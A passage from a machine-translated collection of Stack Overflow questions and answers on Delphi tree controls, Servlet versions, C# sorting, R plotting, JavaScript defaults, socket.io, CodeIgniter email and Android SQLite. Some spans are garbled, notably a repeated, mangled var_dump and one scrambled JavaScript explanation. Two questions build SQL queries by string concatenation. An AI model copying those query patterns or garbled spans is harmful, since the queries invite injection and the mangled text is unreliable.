    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

{ TVirtualStringTree }

procedure TVirtualStringTree.UpdateScrollBars(DoRepaint: Boolean);
begin
  inherited;
  if HandleAllocated and Assigned(FOnUpdateScrollBars) then
    FOnUpdateScrollBars(Self, DoRepaint);
end;

{ TForm1 }

procedure TForm1.FormCreate(Sender: TObject);
begin
  ReportMemoryLeaksOnShutdown := True;
  VirtualStringTree1.NodeDataSize := SizeOf(TNodeSubTree);
  VirtualStringTree1.OnUpdateScrollBars := OnUpdateScrollBars;
end;

procedure TForm1.Button1Click(Sender: TObject);
var
  Data: PNodeSubTree;
  Node: PVirtualNode;
begin
  Node := VirtualStringTree1.AddChild(nil);
  Node := VirtualStringTree1.AddChild(Node);
  VirtualStringTree1.InitNode(Node);
  Data := VirtualStringTree1.GetNodeData(Node);
  Data^ := TNodeSubTree.Create;
  Data^.FChildTree := TVirtualStringTree.Create(nil);
  with Data.FChildTree do
  begin
    Visible := False;
    Parent := VirtualStringTree1;
    Height := 150;
    DefaultNodeHeight := 21;
    Header.AutoSizeIndex := 0;
    Header.Font.Charset := DEFAULT_CHARSET;
    Header.Font.Color := clWindowText;
    Header.Font.Height := -11;
    Header.Font.Name := 'Tahoma';
    Header.Font.Style := [];
    Header.Height := 21;
    Header.Options := [hoColumnResize, hoDrag, hoShowSortGlyphs, hoVisible];
    TabStop := False;
    with Header.Columns.Add do
    begin
      Width := 100;
      Text := 'Header item 1';
    end;
    with Header.Columns.Add do
    begin
      Width := 100;
      Text := 'Header item 2';
    end;
  end;
end;

procedure TForm1.VirtualStringTree1AfterAutoFitColumns(Sender: TVTHeader);
begin
  InvalidateSubTrees(Sender.Treeview);
end;

procedure TForm1.VirtualStringTree1BeforeDrawTreeLine(Sender: TBaseVirtualTree;
  Node: PVirtualNode; Level: Integer; var PosX: Integer);
begin
  if Level = 1 then
    PosX := 0;
end;

procedure TForm1.VirtualStringTree1Collapsed(Sender: TBaseVirtualTree;
  Node: PVirtualNode);
var
  Data: PNodeSubTree;
begin
  Data := VirtualStringTree1.GetNodeData(Node.FirstChild);
  if Assigned(Data^) and Assigned(Data^.FChildTree) then
    Data^.FChildTree.Visible := False;
end;

procedure TForm1.VirtualStringTree1ColumnResize(Sender: TVTHeader;
  Column: TColumnIndex);
begin
  ResizeSubTrees(Sender.Treeview);
end;

procedure TForm1.VirtualStringTree1Expanded(Sender: TBaseVirtualTree;
  Node: PVirtualNode);
var
  Data: PNodeSubTree;
begin
  Data := VirtualStringTree1.GetNodeData(Node.FirstChild);
  if Assigned(Data^) and Assigned(Data^.FChildTree) then
    Data^.FChildTree.Visible := True;
end;

procedure TForm1.VirtualStringTree1FocusChanging(Sender: TBaseVirtualTree;
  OldNode, NewNode: PVirtualNode; OldColumn, NewColumn: TColumnIndex;
  var Allowed: Boolean);
begin
  if Sender.GetNodeLevel(NewNode) = 1 then
  begin
    Allowed := False;
    if Sender.AbsoluteIndex(OldNode) > Sender.AbsoluteIndex(NewNode) then
      Sender.FocusedNode := Sender.GetPreviousSibling(OldNode)
    else
    if OldNode <> Sender.GetLastChild(nil) then
      Sender.FocusedNode := Sender.GetNextSibling(OldNode)
    else
      Sender.FocusedNode := OldNode;
  end;
end;

procedure TForm1.VirtualStringTree1FreeNode(Sender: TBaseVirtualTree;
  Node: PVirtualNode);
var
  Data: PNodeSubTree;
begin
  Data := VirtualStringTree1.GetNodeData(Node);
  if Assigned(Data^) then
  begin
    if Assigned(Data^.FChildTree) then
      Data^.FChildTree.Free;
    Data^.Free;
  end;
end;

procedure TForm1.VirtualStringTree1MeasureItem(Sender: TBaseVirtualTree;
  TargetCanvas: TCanvas; Node: PVirtualNode; var NodeHeight: Integer);
var
  Data: PNodeSubTree;
begin
  if VirtualStringTree1.GetNodeLevel(Node) = 1 then
  begin
    Data := VirtualStringTree1.GetNodeData(Node);
    if Assigned(Data^) and Assigned(Data^.FChildTree) then
      NodeHeight := Data^.FChildTree.Height + 8;
  end;
end;

procedure TForm1.InvalidateSubTrees(Tree: TBaseVirtualTree);
var
  Data: PNodeSubTree;
  Node: PVirtualNode;
begin
  Node := Tree.GetFirst;
  while Assigned(Node) do
  begin
    if Tree.HasChildren[Node] then
    begin
      Data := Tree.GetNodeData(Node.FirstChild);
      if Assigned(Data^) and Assigned(Data^.FChildTree) then
      begin
        Data^.FChildTree.Header.Invalidate(nil);
        Data^.FChildTree.Invalidate;
      end;
    end;
    Node := Tree.GetNextSibling(Node);
  end;
end;

procedure TForm1.ResizeSubTrees(Tree: TBaseVirtualTree);
var
  Node: PVirtualNode;
begin
  Node := Tree.GetFirst;
  while Assigned(Node) do
  begin
    if Tree.HasChildren[Node] then
      UpdateSubTreeBounds(Tree, Node.FirstChild);
    Node := Tree.GetNextSibling(Node);
  end;
end;

procedure TForm1.UpdateSubTreeBounds(Tree: TBaseVirtualTree; Node: PVirtualNode);
var
  R: TRect;
  Data: PNodeSubTree;
begin
  if Assigned(Node) then
  begin
    Data := Tree.GetNodeData(Node);
    if Assigned(Data^) and Assigned(Data^.FChildTree) and
      Data^.FChildTree.Visible then
    begin
      R := Tree.GetDisplayRect(Node, -1, False, True);
      R.Left := R.Left + (Tree as TVirtualStringTree).Indent;
      R.Top := R.Top + 4;
      R.Right := R.Right - 8;
      R.Bottom := R.Bottom - 4;
      Data^.FChildTree.BoundsRect := R;
    end;
  end;
end;

procedure TForm1.OnUpdateScrollBars(Sender: TBaseVirtualTree; DoRepaint: Boolean);
begin
  ResizeSubTrees(Sender);
end;

end. 
```

***单元1.dfm***

```
object Form1: TForm1
  Left = 0
  Top = 0
  Caption = 'Form1'
  ClientHeight = 282
  ClientWidth = 468
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'Tahoma'
  Font.Style = []
  OldCreateOrder = False
  OnCreate = FormCreate
  DesignSize = (
    468
    282)
  PixelsPerInch = 96
  TextHeight = 13
  object VirtualStringTree1: TVirtualStringTree
    Left = 8
    Top = 8
    Width = 371
    Height = 266
    Anchors = [akLeft, akTop, akRight, akBottom]
    Header.AutoSizeIndex = 0
    Header.Font.Charset = DEFAULT_CHARSET
    Header.Font.Color = clWindowText
    Header.Font.Height = -11
    Header.Font.Name = 'Tahoma'
    Header.Font.Style = []
    Header.Height = 21
    Header.Options = [hoColumnResize, hoDblClickResize, hoDrag, hoShowSortGlyphs, hoVisible]
    TabOrder = 0
    TreeOptions.MiscOptions = [toVariableNodeHeight]
    OnAfterAutoFitColumns = VirtualStringTree1AfterAutoFitColumns
    OnBeforeDrawTreeLine = VirtualStringTree1BeforeDrawTreeLine
    OnCollapsed = VirtualStringTree1Collapsed
    OnColumnResize = VirtualStringTree1ColumnResize
    OnExpanded = VirtualStringTree1Expanded
    OnFocusChanging = VirtualStringTree1FocusChanging
    OnFreeNode = VirtualStringTree1FreeNode
    OnMeasureItem = VirtualStringTree1MeasureItem
    ExplicitWidth = 581
    ExplicitHeight = 326
    Columns = <
      item
        Position = 0
        Width = 75
        WideText = 'Column 1'
      end
      item
        Position = 1
        Width = 75
        WideText = 'Column 2'
      end
      item
        Position = 2
        Width = 75
        WideText = 'Column 3'
      end>
  end
  object Button1: TButton
    Left = 385
    Top = 8
    Width = 75
    Height = 25
    Anchors = [akTop, akRight]
    Caption = 'Button1'
    TabOrder = 1
    OnClick = Button1Click
    ExplicitLeft = 595
  end
end 
```

***2.4\. 截屏***

![在此处输入图像描述](../Images/35c7d80f903aa7fd82fb6ab1650c10d1.png)

# web-applications - Java Web 应用程序 - 什么决定了我的 Servlet API 版本？它是否在 web.xml 中指定？

> ID：12146247
> 
> 赞同：24
> 
> 时间：2012-08-27T17:01:15.810
> 
> 标签：web-applications, servlet-3.0

我正在使用 Eclipse EE Juno，而我当前的 Web 应用程序正在使用`Dynamic web modules 2.4`. 我正在尝试将版本提升到 3.0，但由于某种原因我无法做到。当我尝试更改项目方面的版本时，我得到`Cannot change version of project facet Dynamic Web Module to 3.0`. 我的 web.xml 文件中是否有一些双层行可以确定这一点？如果不是单独从 Eclipse 项目方面设置，我如何更改动态 Web 模块版本？

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2012-08-27T17:10:18.197

Servlet 2.4 中`web.xml`：

```
<web-app version="2.4"
  xmlns="http://java.sun.com/xml/ns/j2ee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="
    http://java.sun.com/xml/ns/j2ee
    http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"> 
```

Servlet 3.0 中`web.xml`：

```
<web-app version="3.0"
  xmlns="http://java.sun.com/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="
    http://java.sun.com/xml/ns/javaee
    http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"> 
```

这是唯一的区别。剩下的就是你的 IDE 配置了。为了使用 Servlet 3.0，您必须在 CLASSPATH 上有 3.0 JAR，以便新的注释和其他类可用。但是不要在你的 WAR 中包含 servlet JAR，实现应该来自 servlet 容器。

# c# - 通用排序

> ID：12146248
> 
> 赞同：0
> 
> 时间：2012-08-27T17:01:18.147
> 
> 标签：c#, generics

我有很多实体，我想编写一些通用排序类，它可以为我提供给定对象和属性的排序列表。例如

```
Class Country
{
      public int id { get; set; }
      public string CountryName { get; set; }
} 
```

现在我应该能够将未排序的 List 以及应该对其进行排序的属性名称传递给我的排序器类。到目前为止，我已经打败了自己很长一段时间，现在被卡住了。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T19:43:34.183

`LINQ`使用 .NET扩展方法，或者更具体地说，动态 LINQ 部分可以轻松实现按属性名称排序。查看Scott Gu 编写的[Dynamic LINQ（第 1 部分：使用 LINQ 动态查询库）](http://weblogs.asp.net/scottgu/archive/2008/01/07/dynamic-linq-part-1-using-the-linq-dynamic-query-library.aspx)，了解它是如何工作的。本质上，您的*排序器类*只不过是 LINQ 扩展`OrderBy`和`OrderByDescending`.

这是一个例子：

```
var sortedCountries = listOfCountries.OrderBy("CountryName"); 
```

或者，如果您熟悉泛型，您可以编写一个接受集合的包装器，以及`Func<TSource, TKey>`用于选择属性值的包装器，如下所示：

```
public class MySorterClass
{
    public IEnumerable<TSource> OrderList<TSource, TKey>(IEnumerable<TSource> list, Func<TSource, TKey> selector)
    {
        return list.OrderBy(selector);
    }

    public IEnumerable<TSource> OrderList<TSource>(IEnumerable<TSource> list, string propertyName)
    {
        return list.OrderBy(propertyName);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:06:11.293

如果您使用的是 Java，请查看[Collections.Sort(...)](http://docs.oracle.com/javase/7/docs/api/java/util/Collections.html#sort%28java.util.List,%20java.util.Comparator%29)。有两个版本，一个我认为使用元素的自然顺序对它们进行排序（看看[Compareable](http://docs.oracle.com/javase/7/docs/api/java/lang/Comparable.html)）接口，另一个采用[Comparator](http://docs.oracle.com/javase/7/docs/api/java/util/Comparator.html)。要么应该工作。否则，我相信其他语言也有非常相似的东西。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T17:07:31.180

解决方法：

你没有提到语言。`c#`你可以让你的类实现接口`IComparable`并添加函数，`CompareTo`它接受两个参数并返回一个更大的参数，或者使用匿名函数做同样的事情。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-28T20:15:33.313

最后，我能够实现通用排序器并将其作为扩展方法，因此我可以在使用 List 的任何地方使用它，下面是我的实现。sortorder 是 Asc/Desc，propertyname 是类型 T 的属性的名称。这很好用，我对此很满意。

```
public static List<T> SortedListWithLamda<T>(this List<T> list, string sortorder, string propertyname)
        {
            List<T> sortedlist = new List<T>();
            if (!string.IsNullOrEmpty(propertyname) && list != null && list.Count > 0)
            {

                Type t = list[0].GetType();

                if (sortorder == "A")
                {

                    sortedlist = list.OrderBy(
                        a => t.InvokeMember(
                            propertyname
                            , BindingFlags.GetProperty
                            , null
                            , a
                            , null
                        )
                    ).ToList();
                }
                else
                {
                    sortedlist = list.OrderByDescending(
                        a => t.InvokeMember(
                            propertyname
                            , BindingFlags.GetProperty
                            , null
                            , a
                            , null
                        )
                    ).ToList();
                }
            }
            return sortedlist;
        } 
```

# image - 在 R 中绘制时间序列和图像，以便 x 轴标签完美对齐

> ID：12146252
> 
> 赞同：2
> 
> 时间：2012-08-27T17:01:41.410
> 
> 标签：image, r, plot

我正在尝试在 R 中绘制具有相应频谱图的时间序列（地震仪）。由于我想将时间序列与频谱图进行比较，因此时间序列上的 X 轴标签需要与上的 X 轴标签对齐频谱图。但是，我在这方面遇到了很多麻烦。到目前为止我能做的最好的就是使用

```
par(mar=c(0,10,0,8)) 
```

并尝试通过调整频谱图边距手动强制频谱图标签与时间序列标签对齐。当然，这只是近似值，它们仍然不能完美排列。有没有办法使下面代码生成的轴相互匹配？

```
par(mfcol=c(2,1))
plot(seq_len(1000)*0.01, sin(2*pi*seq_len(1000)*0.01), type="l",xlab="Time",
ylab="Amplitude", main="Time Series", xlim=c(1,10))
image(seq_len(1000)*0.01,seq_len(100)*0.1,array(runif(1000000),dim=c(1000,100)),
xlab="Time", ylab="Frequency", main="Spectrogram", xlim=c(1,10)) 
```

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-27T17:53:11.370

这似乎有效：

```
par(mfcol=c(2,1))
plot(seq_len(1000)*0.01, sin(2*pi*seq_len(1000)*0.01), type="l", xaxs="i")
image(seq_len(1000)*0.01,seq_len(100)*0.1,array(runif(1000000),dim=c(1000,100)),
    xlab="Time", ylab="Frequency", main="Spectrogram") 
```

只需删除 xlim= 参数并在 plot() 函数中使用 xaxs="i" 来匹配 image() 的默认值。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-27T17:49:31.387

您可以添加`xaxs='i'`到调用中`plot`（这会删除额外的填充，使其与图像图对齐），或者您可以`par('usr')`在第一个图之后使用来查看 x 限制是什么，并`xlim`在图像中的调用中使用这些值。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-27T18:42:05.057

事实证明，这比最初看起来要容易得多。秘诀是制作一个“虚拟情节”，然后将图像添加到情节中。因此，新的工作代码如下所示：

```
par(mfcol=c(2,1))
plot(seq_len(1000)*0.01, sin(2*pi*seq_len(1000)*0.01),
type="l",xlab="Time",ylab="Amplitude", main="Time Series")
plot(c(0,10), c(0,10), type="n") #Dummy plot with axis limits for our spectrogram
image(seq_len(1000)*0.01,seq_len(100)*0.1,array(runif(1000000),dim=c(1000,100)),
xlab="Time", ylab="Frequency", main="Spectrogram",add=TRUE) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-12-19T22:49:32.400

与 Greg Snow 的回答类似，但相反，您可以`xaxs='r'`在调用中添加`image`如下内容：

```
par(mar=c(0,10,0,8))
par(mfcol=c(2,1))
plot(seq_len(1000)*0.01, sin(2*pi*seq_len(1000)*0.01), type="l",xlab="Time",
     ylab="Amplitude", main="Time Series", xlim=c(1,10))
image(seq_len(1000)*0.01,seq_len(100)*0.1,array(runif(1000000),dim=c(1000,100)),
      xlab="Time", ylab="Frequency", main="Spectrogram", xlim=c(1,10), xaxs="r") 
```

不要忘记先保存您的 par() 设置。

（也许我应该把它放在上面）

# javascript - 理解 javascript 中的“|| {}”结构

> ID：12146256
> 
> 赞同：3
> 
> 时间：2012-08-27T17:01:55.780
> 
> 标签：javascript, scope, redefinition

> **可能重复：**
> [“var FOO = FOO || {}”在 Javascript 中是什么意思？](https://stackoverflow.com/questions/6439579/what-does-var-foo-foo-mean-in-javascript)
> [Javascript - 你可以在变量声明中添加条件吗](https://stackoverflow.com/questions/11250449/javascript-can-you-add-condition-to-variable-declaration)

我相信这与范围界定有关，而不是重新定义范围。我在流行的 javascript 框架中看到了很多这样的内容：

```
var something = something || {}; 
```

这与不意外地重新定义顶级变量有关吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-27T17:03:04.293

你是对的。如果变量已经存在（我们的或不存在的），请不要更改它。如果它不存在，让我们创建一个新的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-27T17:06:57.053

`var something = something || {};`

可以在带有未设置参数的函数内部使用

```
 function doStuff( arg1, arg2, arg3 ) {
        arg2 = arg2 || {};
        arg3 = arg3 || arg1 + 2;
    }; 
```

当您调用函数 doStuff 时，这使得第二个和第三个参数是可选的

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-27T17:03:54.023

这将创建一个具有本地范围的新对象。如果外部`something`为空、假或未定义（或其他错误），则新变量将为空对象`{}`。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-27T17:04:56.130

您没有重新定义范围，您只是确保变量存在于现有范围内。赋值语句可以读作：

“如果`something`存在（而不是`undefined`，，或`null`，设置（即，什么都不做）。如果它不存在，则创建它并将其设置为等于空对象文字”`0``false``something = something`

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-08-27T17:06:38.927

*这个结构对于不*覆盖现有数据非常有用。假设我们正在处理多个 Javascript 文件，并且我们希望在某个对象上共享一些数据。

*一个.js*

```
var share = window.share = share || { };
share.thisIsA = true; 
```

*b.js*

```
var share = window.share = share || { };
share.thisIsB = true; 
```

如果我们有两个以上的文件并且我们异步加载这些文件（我们不能保证顺序），我们不会覆盖`share`之前定义和填充的全局对象。这是*命名空间对象*或*配置对象*的一种非常常见的做法。

另一个非常常见的用例是创建*默认值*。例如

```
function foo( option ) {
    option = option || 'something';

    if( option === 'foobar' ) {} // ...
} 
```

在那里，如果函数在没有参数的情况下被调用，我们使用该模式为我们的选项参数提供至少一个已知和定义的值。例如，您可以在插件代码中经常看到这一点。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-08-27T17:07:14.807

这和这样做是一样的：

```
var something = ( something ) ? something : {}; 
```

`( something )`对真值或假值的评估在哪里。如果truthy（`something`存在），它将等于自身，否则为空对象。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-27T17:09:11.883

看起来更像是在确保某物是可以挂在上面的物体。设置默认值。

一旦你调用 var something 或将其设置为函数的参数，该范围内的所有实例都是新变量，你无法访问更高范围内的实例。

```
(function() {
  var something = 'foo';

  (function() {
    var something = something || 'bar';

    console.log(something);
  })();

  console.log(something);
})(); 
```

将输出

```
'bar'
'foo' 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-08-27T17:12:38.117

javascript中的OR构造函数接近这个函数

```
function or(a, b)
{
  if(a) return a;
  else return b;
} 
```

当“a”评估为真时，它甚至不检查“b”（也不执行它，但它不是函数案例）。此外，它**返回纯“a”而不将其更改为 boolean**。非布尔变量“ORed”的构造**计算为第一个变为布尔值 true**。它广泛用于无法支持某些东西的地方。

```
var functionDoingSomethingCrossBrowser = functionOnMsie 
                                      || functionEverywhereElse; 
```

`{}`当您的“某物”在范围内不可用时（很可能未定义，其评估结果为假），这与（新对象）运算符相结合用空对象填充变量。

# node.js - 在没有处理程序的情况下创建服务器时找不到客户端的 socket.io

> ID：12146257
> 
> 赞同：1
> 
> 时间：2012-08-27T17:02:12.417
> 
> 标签：node.js, socket.io

浏览器找不到客户端的 socket.io.js：

```
<script src="/socket.io/socket.io.js"></script> 
```

在没有处理程序的情况下创建服务器时：

```
var app = require('http').createServer(handler)
  , io = require('socket.io').listen(app)
  , fs = require('fs');

app.listen(80);

//without this part:
/*function handler (req, res) {
  fs.readFile(__dirname + '/index.html',
  function (err, data) {
    if (err) {
      res.writeHead(500);
      return res.end('Error loading index.html');
    }

    res.writeHead(200);
    res.end(data);
  });
}*/

io.sockets.on('connection', function (socket) {
  socket.emit('news', { hello: 'world' });
  socket.on('my other event', function (data) {
    console.log(data);
  });
}); 
```

我不需要也不想要处理函数，因为我在 PHP 中生成的所有内容。有时对 index.html/php 以外的其他文件使用客户端应用程序功能

那么如何让浏览器可以找到socket.io.js呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-07-01T09:07:55.117

将其包含在您的客户端！

```
<script type="text/javascript" src="/socket.io/socket.io.js"></script> 
var io = io.connect(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T17:33:54.850

如果您不需要访问 http 模块功能，请使用以下方式：

```
var io = require('socket.io').listen(80);

io.sockets.on('connection', function (socket) {
  socket.emit('news', { hello: 'world' });
  socket.on('my other event', function (data) {
    console.log(data);
  });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-27T18:02:28.353

我[写](https://github.com/dotcloud/socket.io-on-dotcloud)了一个演示应用程序，如果你不想花太多时间开始使用 socket.io 和 Express 3，你可以看看它。

要让 websockets 工作，您的客户端 js 需要从 web 服务器交付。这是众多浏览器限制之一。最简单的设置是拥有一个同时提供客户端 Js 和 WebSockets 的节点服务器。使用 Express 的 http 模块更简单（如果你想构建的不仅仅是一个测试应用程序，有点过分但超级实用）。

否则，您需要让客户端 js 指向正确的位置。例如，如果您运行端口 8080 的 socket.io 服务器，并在端口 8000 上提供静态客户端（`python -m SimpleHTTPServer`例如，使用常规 apache 或端口 80）。

```
<script src="http://localhost:8080/socket.io/socket.io.js"></script> 
```

# php - 为什么 CodeIgniter 在我创建的模型中产生“调用未定义的方法”？

> ID：12146266
> 
> 赞同：1
> 
> 时间：2012-08-27T17:02:43.320
> 
> 标签：php, codeigniter, email

因此，我的任务是为我们的会员数据库创建一个功能，该功能将每月提醒某人他们的会员资格何时到期。如果一个人的会员资格到期时间不超过 6 个月，我们会发送一封电子邮件，如果他们的会员资格到期 3 个月，我们会发送另一封电子邮件。没有大喊大叫。我首先创建一个这样的模型：

```
class Email extends CI_Model {

function __construct()
{
    parent::__construct();
}

// -----------------EMAIL-----------------
function emailMessage($message = 1,$recipient = 1777) { // Default "Test" Numbers
    $rInfo = $this->db->query("SELECT * FROM Members WHERE intKey = " . $recipient)->row();
    $eInfo = $this->db->query("SELECT * FROM Emails WHERE intKey = " . $message)->row(); 

    // Replacements?
    $bodyCopy = $eInfo->txtEmail;
    $bodyCopy = str_replace("[firstname]",$rInfo->strFirstName,$bodyCopy);  

    $this->load->library('email');
    $this->email->from('someone@example.com','John Q Public');
    $this->email->to($rInfo->strEmail); 
    $this->email->subject($eInfo->strTitle);
    $this->email->message($bodyCopy);
    $this->email->send();
    $this->email->clear();
}
} 
```

一切都很好，当我从我建立的网站的任何其他部分调用这个模型时，它工作正常。这是处理必须发送给我们选区的任何股票电子邮件的好方法。通常，它在代码中是这样的：

```
$this->load->model('email');
$this->email->emailMessage(8,$this->session->userdata('memberKey')); 
```

奇迹般有效。我以前使用它的地方和现在使用它的地方之间的最大区别是我将对模型的调用包含在一个循环中，如下所示：

```
public function warningEmails() {
    $this->load->model('email');
    $sql = 'SELECT
                *, FLOOR(
                    DATEDIFF(dtAccreditationEnd, now())/ 30
                )AS diff
            FROM
                tblMembers
            WHERE
                enmAccredited = "yes"
            AND dtAccreditationEnd < DATE_ADD(now(), INTERVAL 6 MONTH)
            ORDER BY
                diff
    ';  
    $emailSend = $this->db->query($sql);
    foreach ($emailSend->result() as $row) {
        if ($row->diff <= 3) {
            $letter = 10;
        } else {
            $letter = 9;
        }
        $this->email->emailMessage($letter,$row->intMembersKey);
    }
} 
```

它在第一次循环中运行良好，并且在循环的下一次迭代中失败并显示以下消息：

**致命错误：在第****1033**行的**/home/contract/public_html/members/application/controllers/staff.php**中调用未定义的方法 CI_Email::emailMessage()

 **第 1033 行是这一行：

```
 $this->email->emailMessage($letter,$row->intMembersKey); 
```

我有一个问题，这个模型只能在给定的实例中调用一次？我究竟做错了什么？预先感谢您的协助！

**编辑：**我要添加一个 var_dump($this->email); 看看它可能是什么......

> object(CI_Email)#30 (46) { ["useragent"]=> string(11) "CodeIgniter" ["mailpath"]=> string(18) "/usr/sbin/sendmail"
> ["protocol"]=>字符串（4）“邮件”[“smtp_host”]=>字符串（0）“
> ”[“smtp_user”]=>字符串（0）“”[“smtp_pass”]=>字符串（0）“”
> [“smtp_port” ]=> string(2) "25" ["smtp_timeout"]=> int(5)
> ["smtp_crypto"]=> string(0) "" ["wordwrap"]=> bool(true)
> ["wrapchars"] => string(2) "76" ["mailtype"]=> string(4) "text"
> ["charset"]=> string(5) "utf-8" ["multipart"]=> string(5) "mixed" ["alt_message"]=> string(0) "" ["validate"]=>
> bool(false) ["priority"]=> string(1) "3" ["newline"]=>
> 字符串(1) " " ["crlf"]=> 字符串(1) " " ["send_multipart"]=>
> bool(true) ["bcc_batch_mode"]=> bool(false) ["bcc_batch_size"]=> int(200) ["_safe_mode"]=> bool(false) ["_subject"]=> string(0) "" [“_body”]=> 字符串（357）“杰弗里，
> 
> 这提醒您，您的 PDCA 认证将在 3 个月后到期。访问您的会员仪表板，在您方便的时候查看所有完整和不完整的课程作业。会员仪表板将帮助您完成完成过程。如需更多信息，请通过某人@example.com 或 1-800-555-1212 联系某人。" ["_finalbody"]=> string(0) ""
> ["_alt_boundary"]=> string(0) "" [ "_atc_boundary"]=> 字符串(0) "" ["_header_str"]=> 字符串(0) "" ["_smtp_connect"]=>
> 字符串(0) "" ["_encoding"]=> 字符串(4) " 8bit" ["_IP"]=>
> bool(false) ["_smtp_auth"]=> bool(false) ["
> 
> string(17) "recipient@example.com" ["_cc_array"]=> array(0) { } ["_bcc_array"]=> array(0) { } ["_headers"]=> array(5) { [ "From"]=> string(54) ""Someone Example" " ["Return-Path"]=> string(28) "" ["Cc"]=> string(16) "copy@example.com" [ "Bcc"]=> string(17) "blindcopy@example.com" ["Subject"]=> string(49) "=?utf-8?Q?PDCA_Accreditation_Expiration_Warning?=" } ["_attach_name"]=> 数组(0) { } ["_attach_type"]=> array(0) { } ["_attach_disp"]=> array(0) { } ["_protocols"]=> array(3) { [0]=> string( 4) "邮件“[1]=>字符串（8）“发送邮件”[2]=>字符串（4）“smtp”}[“_base_charsets”]=>数组（2）{[0]=>字符串（8）“我们-ascii" [1]=> 字符串(9) "iso-2022-" } ["_bit_depths"]=> 数组(2) { [0]=> 字符串(4) "7bit" [1]=> 字符串( 4）“8bit”}[“_priorities”]=>数组（5）{[0]=>字符串（11）“1（最高）”[1]=>字符串（8）“2（高）”[2 ]=> string(10) "3 (Normal)" [3]=> string(7) "4 (Low)" [4]=> string(10) "5 (Lowest)" } }_base_charsets"]=> 数组(2) { [0]=> 字符串(8) "us-ascii" [1]=> 字符串(9) "iso-2022-" } ["_bit_depths"]=> 数组(2 ) { [0]=> string(4) "7bit" [1]=> string(4) "8bit" } ["_priorities"]=> array(5) { [0]=> string(11) "1 （最高）”[1]=> 字符串（8）“2（高）”[2]=> 字符串（10）“3（正常）”[3]=> 字符串（7）“4（低）”[ 4]=> 字符串(10) "5 (最低)" } }_base_charsets"]=> 数组(2) { [0]=> 字符串(8) "us-ascii" [1]=> 字符串(9) "iso-2022-" } ["_bit_depths"]=> 数组(2 ) { [0]=> string(4) "7bit" [1]=> string(4) "8bit" } ["_priorities"]=> array(5) { [0]=> string(11) "1 （最高）”[1]=> 字符串（8）“2（高）”[2]=> 字符串（10）“3（正常）”[3]=> 字符串（7）“4（低）”[ 4]=> 字符串(10) "5 (最低)" } }[1]=> string(4) "8bit" } ["_priorities"]=> array(5) { [0]=> string(11) "1 (最高)" [1]=> string(8) " 2（高）”[2]=>字符串（10）“3（正常）”[3]=>字符串（7）“4（低）”[4]=>字符串（10）“5（最低）” } }[1]=> string(4) "8bit" } ["_priorities"]=> array(5) { [0]=> string(11) "1 (最高)" [1]=> string(8) " 2（高）”[2]=>字符串（10）“3（正常）”[3]=>字符串（7）“4（低）”[4]=>字符串（10）“5（最低）” } }

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-02T22:07:03.430

我有类似的症状，但由于不同的问题。我最近通过我选择的编辑器将我的模型文件名从 name_model.php 更改为 Name_model.php，我几乎没有意识到我的编辑器实际上并没有删除旧的 name_model.php 文件，所以有两个文件位于具有相同名称和不同大小写的目录。

我在我的模型中创建了一个新函数，但它正在读取旧模型文件，这让我等了好几个小时，直到我查看了目录中的实际文件。

只需删除旧文件即可解决我的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-27T17:57:34.877

也许我误读了这个，但不是这一行： $this->load->library('email');

加载写入此行的电子邮件库？我认为您正在递归地杀死自己。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-27T18:02:19.707

尝试通过这样做将官方电子邮件库重命名为另一个，

```
$this->load->library('email', NULL, 'ci_email'); 
```

然后通过这样做访问它，

```
$this->ci_email->from('someone@example.com','John Q Public'); 
```

当前的电子邮件库已覆盖您的电子邮件模型。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-10T11:34:59.963

我无法通过自动加载加载我的库类 MbSec{}

```
$autoload['libraries'] = array('database', 'mbsec'); 
```

或控制器中的负载。

```
$this->load->library('mbsec'); 
```

但似乎与 Capitals 合作，这不违反逻辑吗？

```
$autoload['libraries'] = array('database', 'MbSec'); 
```**

# android - 从 sql 数据库中选择一个单元格

> ID：12146267
> 
> 赞同：0
> 
> 时间：2012-08-27T17:02:45.993
> 
> 标签：android, sql, sqlite

我正在我的 Android 应用程序中尝试一个简单的 SQL 命令，以获取所选人员的年龄：

```
public int getAge(){
    SQLiteDatabase db = this.getReadableDatabase();
    Cursor cursor = db.rawQuery("SELECT * FROM persons WHERE name =? " + MainActivity.selectedPerson.getText().toString(), null);
    int age = cursor.getInt(3);               // column with ages
    cursor.close();
    db.close();
    return age;
} 
```

但是当我运行我的应用程序时，当我调用函数 getAge() 时它会崩溃。我收到以下错误：

```
SQLiteException: no such column: Max: , while compiling: SELECT * FROM persons WHERE name = Max 
```

